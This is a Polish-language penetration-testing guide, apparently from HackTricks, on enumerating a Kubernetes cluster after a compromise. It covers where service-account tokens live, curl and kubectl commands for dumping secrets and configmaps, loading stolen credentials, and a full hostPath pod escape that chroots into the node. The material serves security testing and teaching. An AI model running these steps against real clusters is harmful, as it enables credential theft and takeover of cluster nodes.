# Kubernetes Enumeration

{{#include ../../banners/hacktricks-training.md}}

## Kubernetes Tokens

Jeśli masz skompromitowany dostęp do maszyny, użytkownik może mieć dostęp do niektórej platformy Kubernetes. Token zazwyczaj znajduje się w pliku wskazywanym przez **env var `KUBECONFIG`** lub **w `~/.kube`**.

W tym folderze możesz znaleźć pliki konfiguracyjne z **tokenami i konfiguracjami do połączenia z serwerem API**. W tym folderze możesz również znaleźć folder cache z informacjami wcześniej pobranymi.

Jeśli skompromitowałeś pod w środowisku Kubernetes, są inne miejsca, w których możesz znaleźć tokeny i informacje o bieżącym środowisku K8:

### Service Account Tokens

Zanim przejdziesz dalej, jeśli nie wiesz, czym jest usługa w Kubernetes, sugeruję **przeczytać ten link i zapoznać się przynajmniej z informacjami o architekturze Kubernetes.**

Z dokumentacji Kubernetes [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_„Kiedy tworzysz pod, jeśli nie określisz konta usługi, automatycznie przypisywane jest_ domyślne _konto usługi w tej samej przestrzeni nazw.”_

**ServiceAccount** to obiekt zarządzany przez Kubernetes, używany do zapewnienia tożsamości dla procesów działających w podzie.\
Każde konto usługi ma z nim powiązany sekret, a ten sekret zawiera token dostępu. Jest to JSON Web Token (JWT), metoda reprezentowania roszczeń w sposób bezpieczny między dwiema stronami.

Zazwyczaj **jeden** z katalogów:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccount`

zawiera pliki:

- **ca.crt**: To certyfikat CA do sprawdzania komunikacji Kubernetes
- **namespace**: Wskazuje bieżącą przestrzeń nazw
- **token**: Zawiera **token usługi** bieżącego poda.

Teraz, gdy masz token, możesz znaleźć serwer API w zmiennej środowiskowej **`KUBECONFIG`**. Aby uzyskać więcej informacji, uruchom `(env | set) | grep -i "kuber|kube`**`"`**

Token konta usługi jest podpisywany kluczem znajdującym się w pliku **sa.key** i weryfikowany przez **sa.pub**.

Domyślna lokalizacja w **Kubernetes**:

- /etc/kubernetes/pki

Domyślna lokalizacja w **Minikube**:

- /var/lib/localkube/certs

### Hot Pods

_**Hot pods to**_ pody zawierające token konta usługi z uprawnieniami. Token konta usługi z uprawnieniami to token, który ma pozwolenie na wykonywanie uprzywilejowanych zadań, takich jak wyświetlanie sekretów, tworzenie podów itp.

## RBAC

Jeśli nie wiesz, czym jest **RBAC**, **przeczytaj tę sekcję**.

## GUI Applications

- **k9s**: GUI, które enumeruje klaster Kubernetes z terminala. Sprawdź polecenia w [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). Napisz `:namespace` i wybierz wszystko, aby następnie wyszukać zasoby we wszystkich przestrzeniach nazw.
- **k8slens**: Oferuje kilka dni próbnych: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

Aby enumerować środowisko K8s, potrzebujesz kilku rzeczy:

- **ważnego tokena uwierzytelniającego**. W poprzedniej sekcji zobaczyliśmy, gdzie szukać tokena użytkownika i tokena konta usługi.
- **adresu (**_**https://host:port**_**) serwera API Kubernetes**. Zazwyczaj można go znaleźć w zmiennych środowiskowych i/lub w pliku kube config.
- **Opcjonalnie**: **ca.crt do weryfikacji serwera API**. Można go znaleźć w tych samych miejscach, w których można znaleźć token. Jest to przydatne do weryfikacji certyfikatu serwera API, ale używając `--insecure-skip-tls-verify` z `kubectl` lub `-k` z `curl`, nie będziesz tego potrzebować.

Mając te szczegóły, możesz **enumerować Kubernetes**. Jeśli **API** z jakiegoś powodu jest **dostępne** przez **Internet**, możesz po prostu pobrać te informacje i enumerować platformę z własnego hosta.

Jednak zazwyczaj **serwer API znajduje się w wewnętrznej sieci**, dlatego będziesz musiał **utworzyć tunel** przez skompromitowaną maszynę, aby uzyskać do niego dostęp z własnej maszyny, lub możesz **przesłać** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) binarny, lub użyć **`curl/wget/cokolwiek`** do wykonywania surowych żądań HTTP do serwera API.

### Differences between `list` and `get` verbs

Dzięki uprawnieniom **`get`** możesz uzyskać dostęp do informacji o konkretnych zasobach (_opcja `describe` w `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Jeśli masz uprawnienia **`list`**, możesz wykonywać żądania API, aby wylistować dany typ zasobu (_`get` opcja w `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Jeśli masz uprawnienia **`watch`**, możesz wykonywać żądania API w celu monitorowania zasobów:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Otwierają połączenie strumieniowe, które zwraca pełny manifest Deploymentu za każdym razem, gdy się zmienia (lub gdy tworzony jest nowy).

> [!CAUTION]
> Następujące polecenia `kubectl` wskazują tylko, jak wylistować obiekty. Jeśli chcesz uzyskać dostęp do danych, musisz użyć `describe` zamiast `get`.

### Używanie curl

Z wnętrza poda możesz użyć kilku zmiennych środowiskowych:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
> [!WARNING]
> Domyślnie pod może **uzyskać dostęp** do **serwera kube-api** w nazwie domeny **`kubernetes.default.svc`** i możesz zobaczyć sieć kube w **`/etc/resolv.config`**, ponieważ tutaj znajdziesz adres serwera DNS kubernetes (".1" w tym samym zakresie to punkt końcowy kube-api).

### Używanie kubectl

Mając token i adres serwera API, używasz kubectl lub curl, aby uzyskać do niego dostęp, jak wskazano tutaj:

Domyślnie, APISERVER komunikuje się z schematem `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
> jeśli nie ma `https://` w adresie URL, możesz otrzymać błąd typu Bad Request.

Możesz znaleźć [**oficjalną ściągawkę kubectl tutaj**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Celem poniższych sekcji jest przedstawienie w uporządkowany sposób różnych opcji do enumeracji i zrozumienia nowego K8s, do którego uzyskałeś dostęp.

Aby znaleźć żądanie HTTP, które wysyła `kubectl`, możesz użyć parametru `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Aktualna konfiguracja

{{#tabs }}
{{#tab name="Kubectl" }}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{{#endtab }}
{{#endtabs }}

Jeśli udało ci się ukraść dane uwierzytelniające niektórych użytkowników, możesz **skonfigurować je lokalnie** za pomocą czegoś takiego jak:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Uzyskaj obsługiwane zasoby

Dzięki tym informacjom będziesz wiedzieć, wszystkie usługi, które możesz wymienić

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{{#endtab }}
{{#endtabs }}

### Uzyskaj bieżące uprawnienia

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{{#endtab }}
{{#endtabs }}

Innym sposobem na sprawdzenie swoich uprawnień jest użycie narzędzia: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

Możesz dowiedzieć się więcej o **Kubernetes RBAC** w:

{{#ref}}
kubernetes-role-based-access-control-rbac.md
{{#endref}}

**Gdy już wiesz, jakie uprawnienia** posiadasz, sprawdź następującą stronę, aby ustalić **czy możesz je wykorzystać** do eskalacji uprawnień:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Uzyskaj inne role

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get roles
k get clusterroles
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{{#endtab }}
{{#endtabs }}

### Pobierz przestrzenie nazw

Kubernetes wspiera **wiele wirtualnych klastrów** opartych na tym samym fizycznym klastrze. Te wirtualne klastry nazywane są **przestrzeniami nazw**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get namespaces
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{{#endtab }}
{{#endtabs }}

### Uzyskaj sekrety

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{{#endtab }}
{{#endtabs }}

Jeśli możesz odczytać sekrety, możesz użyć następujących linii, aby uzyskać uprawnienia związane z każdym tokenem:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Uzyskaj konta serwisowe

Jak omówiono na początku tej strony, **gdy uruchamiany jest pod, zazwyczaj przypisywane jest do niego konto serwisowe**. Dlatego wylistowanie kont serwisowych, ich uprawnień i miejsc, w których działają, może umożliwić użytkownikowi eskalację uprawnień.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get serviceaccounts
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{{#endtab }}
{{#endtabs }}

### Pobierz wdrożenia

Wdrożenia określają **komponenty**, które muszą być **uruchomione**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get deployments
k get deployments -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{{#endtab }}
{{#endtabs }}

### Pobierz Pods

Pods to rzeczywiste **kontenery**, które będą **uruchamiane**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get pods
k get pods -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{{#endtab }}
{{#endtabs }}

### Uzyskaj usługi

Kubernetes **usługi** są używane do **ekspozycji usługi na określonym porcie i IP** (które będą działać jako load balancer dla podów, które faktycznie oferują usługę). To jest interesujące, aby wiedzieć, gdzie można znaleźć inne usługi, aby spróbować zaatakować.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get services
k get services -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{{#endtab }}
{{#endtabs }}

### Pobierz węzły

Pobierz wszystkie **węzły skonfigurowane w klastrze**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get nodes
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{{#endtab }}
{{#endtabs }}

### Pobierz DaemonSets

**DaeamonSets** pozwala zapewnić, że **konkretny pod działa na wszystkich węzłach** klastra (lub na wybranych). Jeśli usuniesz DaemonSet, podsy zarządzane przez niego również zostaną usunięte.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get daemonsets
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{{#endtab }}
{{#endtabs }}

### Uzyskaj cronjob

Cron jobs pozwalają na zaplanowanie uruchomienia poda, który wykona jakąś akcję, przy użyciu składni podobnej do crontab.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get cronjobs
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{{#endtab }}
{{#endtabs }}

### Pobierz configMap

configMap zawsze zawiera wiele informacji i plików konfiguracyjnych, które są dostarczane do aplikacji działających w kubernetes. Zwykle można znaleźć wiele haseł, sekretów, tokenów, które są używane do łączenia się i weryfikacji z innymi wewnętrznymi/zewnętrznymi usługami.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get configmaps # -n namespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{{#endtab }}
{{#endtabs }}

### Uzyskaj polityki sieciowe / Polityki sieciowe Cilium

{{#tabs }}
{{#tab name="Pierwsza zakładka" }}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{{#endtab }}
{{#endtabs }}

### Zdobądź wszystko / Wszystko

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all
```
{{#endtab }}
{{#endtabs }}

### **Pobierz wszystkie zasoby zarządzane przez helm**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{{#endtab }}
{{#endtabs }}

### **Uzyskaj zużycie Podów**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k top pod --all-namespaces
```
{{#endtab }}
{{#endtabs }}

### Ucieczka z poda

Jeśli jesteś w stanie tworzyć nowe pody, możesz być w stanie uciec z nich do węzła. Aby to zrobić, musisz stworzyć nowy pod za pomocą pliku yaml, przełączyć się na utworzony pod, a następnie chrootować do systemu węzła. Możesz użyć już istniejących podów jako odniesienia do pliku yaml, ponieważ wyświetlają one istniejące obrazy i ścieżki.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> jeśli musisz utworzyć pod na konkretnym węźle, możesz użyć następującego polecenia, aby uzyskać etykiety na węźle
>
> `k get nodes --show-labels`
>
> Zwykle, kubernetes.io/hostname i node-role.kubernetes.io/master to dobre etykiety do wyboru.

Następnie tworzysz swój plik attack.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Po tym tworzysz pod.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Teraz możesz przełączyć się na utworzony pod w następujący sposób
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
A na koniec chrootujesz do systemu węzła
```bash
chroot /root /bin/bash
```
Informacje uzyskane z: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Odniesienia

{{#ref}}
https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
